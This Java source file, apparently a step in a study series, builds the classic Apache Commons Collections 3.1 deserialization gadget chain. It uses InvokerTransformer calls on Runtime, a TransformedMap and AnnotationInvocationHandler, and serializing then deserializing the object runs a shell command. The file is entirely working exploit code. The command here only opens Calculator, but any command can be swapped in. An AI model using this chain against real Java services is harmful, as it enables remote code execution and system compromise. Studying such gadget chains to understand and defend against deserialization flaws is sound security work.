package Commons_collection3_1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.*;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class step4 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] {String.class},
                        new Object[] {"open -a Calculator"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "Threezh1");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        Object ins = cons.newInstance(java.lang.annotation.Retention.class, outerMap);
        ByteArrayOutputStream exp = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(exp);
        oos.writeObject(ins);
        oos.flush();
        oos.close();

        ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(out);
        Object obj = (Object) ois.readObject();
    }
}
